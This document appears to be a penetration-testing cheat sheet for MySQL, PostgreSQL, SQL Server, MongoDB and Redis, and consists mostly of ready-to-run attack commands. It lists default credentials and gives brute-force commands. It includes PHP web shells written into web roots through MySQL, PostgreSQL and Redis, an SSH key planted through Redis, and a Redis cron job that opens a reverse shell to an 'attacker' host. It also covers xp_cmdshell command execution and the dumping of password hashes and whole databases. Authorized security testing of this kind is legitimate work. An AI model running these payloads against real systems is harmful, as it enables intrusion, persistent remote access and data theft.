# Database Penetration Testing Methodology

## Overview
This methodology covers testing of common database services: MySQL/MariaDB, PostgreSQL, Microsoft SQL Server, MongoDB, and Redis.

---

## MySQL/MariaDB (Port 3306)

### Initial Reconnaissance
```bash
# Nmap scripts
nmap -sV -sC -p3306 --script=mysql-* {target}

# Banner grab
echo "quit" | nc {target} 3306
```

### Authentication Testing

#### Default Credentials
- root: (empty)
- root:root
- root:mysql
- mysql:mysql
- admin:admin

#### Brute Force
```bash
# Hydra
hydra -L users.txt -P passwords.txt mysql://{target}

# Medusa
medusa -h {target} -U users.txt -P passwords.txt -M mysql

# Ncrack
ncrack -p3306 --user root -P passwords.txt {target}
```

### Direct Connection
```bash
mysql -h {target} -u root
mysql -h {target} -u root -p
```

### Exploitation

#### CVE-2012-2122 - Authentication Bypass
```bash
# Attempt many connections, may authenticate incorrectly
for i in $(seq 1 1000); do mysql -u root --password=bad -h {target} 2>/dev/null; done
```

#### UDF Privilege Escalation
If you have MySQL access:
```sql
-- Check for lib_mysqludf_sys
SELECT * FROM mysql.func;

-- Execute commands
SELECT sys_exec('id');
```

### Metasploit Modules
```bash
use auxiliary/scanner/mysql/mysql_version
use auxiliary/scanner/mysql/mysql_login
use auxiliary/admin/mysql/mysql_enum
use auxiliary/scanner/mysql/mysql_hashdump
use exploit/multi/mysql/mysql_udf_payload
```

### Information Gathering
```sql
-- Version
SELECT @@version;

-- Current user
SELECT user();

-- Databases
SHOW DATABASES;

-- Users and hashes
SELECT user,host,authentication_string FROM mysql.user;

-- File read (requires FILE privilege)
SELECT LOAD_FILE('/etc/passwd');

-- File write (requires FILE privilege)
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
```

---

## PostgreSQL (Port 5432)

### Initial Reconnaissance
```bash
# Nmap scripts
nmap -sV -sC -p5432 --script=pgsql-* {target}
```

### Authentication Testing

#### Default Credentials
- postgres:postgres
- postgres:(empty)
- admin:admin

#### Brute Force
```bash
hydra -L users.txt -P passwords.txt postgres://{target}
```

### Direct Connection
```bash
psql -h {target} -U postgres
psql "host={target} user=postgres"
```

### Exploitation

#### Command Execution via COPY
```sql
-- Read files
CREATE TABLE temp(t TEXT);
COPY temp FROM '/etc/passwd';
SELECT * FROM temp;

-- Write files (requires superuser)
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';
```

#### Command Execution via Extensions
```sql
-- Check available extensions
SELECT * FROM pg_available_extensions;

-- If plpythonu is available
CREATE EXTENSION plpythonu;
CREATE FUNCTION exec_cmd(cmd text) RETURNS text AS $$
import os
return os.popen(cmd).read()
$$ LANGUAGE plpythonu;

SELECT exec_cmd('id');
```

### Metasploit Modules
```bash
use auxiliary/scanner/postgres/postgres_version
use auxiliary/scanner/postgres/postgres_login
use auxiliary/admin/postgres/postgres_sql
use exploit/linux/postgres/postgres_payload
```

### Information Gathering
```sql
-- Version
SELECT version();

-- Current user
SELECT current_user;

-- Databases
SELECT datname FROM pg_database;

-- Tables
SELECT tablename FROM pg_tables WHERE schemaname='public';

-- Users
SELECT usename, passwd FROM pg_shadow;
```

---

## Microsoft SQL Server (Port 1433)

### Initial Reconnaissance
```bash
# Nmap scripts
nmap -sV -sC -p1433 --script=ms-sql-* {target}

# UDP discovery
nmap -sU -p1434 --script=ms-sql-info {target}
```

### Authentication Testing

#### Default Credentials
- sa:(empty)
- sa:sa
- sa:password

#### Brute Force
```bash
hydra -L users.txt -P passwords.txt mssql://{target}
```

### Direct Connection
```bash
# Using sqsh
sqsh -S {target} -U sa

# Using Impacket
impacket-mssqlclient sa@{target}
impacket-mssqlclient domain/user:password@{target} -windows-auth
```

### Exploitation

#### xp_cmdshell
```sql
-- Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Execute commands
EXEC xp_cmdshell 'whoami';
```

#### Linked Servers
```sql
-- List linked servers
EXEC sp_linkedservers;

-- Execute on linked server
EXEC ('xp_cmdshell ''whoami''') AT LinkedServer;
```

### Metasploit Modules
```bash
use auxiliary/scanner/mssql/mssql_ping
use auxiliary/scanner/mssql/mssql_login
use auxiliary/admin/mssql/mssql_enum
use auxiliary/admin/mssql/mssql_exec
use exploit/windows/mssql/mssql_payload
```

### Information Gathering
```sql
-- Version
SELECT @@version;

-- Current user
SELECT SYSTEM_USER;

-- Databases
SELECT name FROM sys.databases;

-- Tables
SELECT * FROM information_schema.tables;

-- Users
SELECT name FROM sys.sql_logins;

-- Password hashes
SELECT name, password_hash FROM sys.sql_logins;
```

---

## MongoDB (Port 27017)

### Initial Reconnaissance
```bash
# Nmap scripts
nmap -sV -sC -p27017 --script=mongodb-* {target}
```

### Direct Connection
```bash
# MongoDB shell
mongosh --host {target} --port 27017

# Legacy mongo client
mongo {target}:27017
```

### Common Vulnerabilities

#### No Authentication (Default)
MongoDB often runs without authentication by default.

```javascript
// List databases
show dbs

// Use database
use admin

// List collections
show collections

// Dump all documents
db.getCollectionNames().forEach(function(c) { print(c); db[c].find().forEach(printjson); })
```

#### Default Credentials
- admin:admin
- root:root

### Information Gathering
```javascript
// Server info
db.serverStatus()

// Current database
db.getName()

// Users
db.getUsers()

// All databases and collections
db.adminCommand({listDatabases: 1})
```

### Metasploit Modules
```bash
use auxiliary/scanner/mongodb/mongodb_login
use auxiliary/gather/mongodb_js_inject_collection_enum
```

---

## Redis (Port 6379)

### Initial Reconnaissance
```bash
# Nmap scripts
nmap -sV -sC -p6379 --script=redis-* {target}
```

### Direct Connection
```bash
redis-cli -h {target}
```

### Common Vulnerabilities

#### No Authentication
```bash
# Check if authentication required
redis-cli -h {target} INFO
```

#### Arbitrary File Write
```bash
# Write SSH key
redis-cli -h {target}
CONFIG SET dir /root/.ssh/
CONFIG SET dbfilename authorized_keys
SET key "\n\nssh-rsa AAAA... user@attacker\n\n"
SAVE

# Write webshell
CONFIG SET dir /var/www/html/
CONFIG SET dbfilename shell.php
SET key "<?php system($_GET['cmd']); ?>"
SAVE

# Write cron job
CONFIG SET dir /var/spool/cron/crontabs/
CONFIG SET dbfilename root
SET key "\n* * * * * /bin/bash -i >& /dev/tcp/attacker/4444 0>&1\n"
SAVE
```

### Metasploit Modules
```bash
use auxiliary/scanner/redis/redis_server
use auxiliary/scanner/redis/file_upload
use exploit/linux/redis/redis_replication_cmd_exec
```

### Information Gathering
```bash
# Server info
INFO

# All keys
KEYS *

# Configuration
CONFIG GET *

# Client list
CLIENT LIST
```

---

## General Database Testing Checklist

- [ ] Version and service identification
- [ ] Authentication required?
- [ ] Default/weak credentials tested
- [ ] Brute force tested
- [ ] Known vulnerabilities checked
- [ ] Privilege escalation paths explored
- [ ] File read/write capabilities tested
- [ ] Command execution tested
- [ ] Sensitive data extracted
- [ ] Network segmentation verified
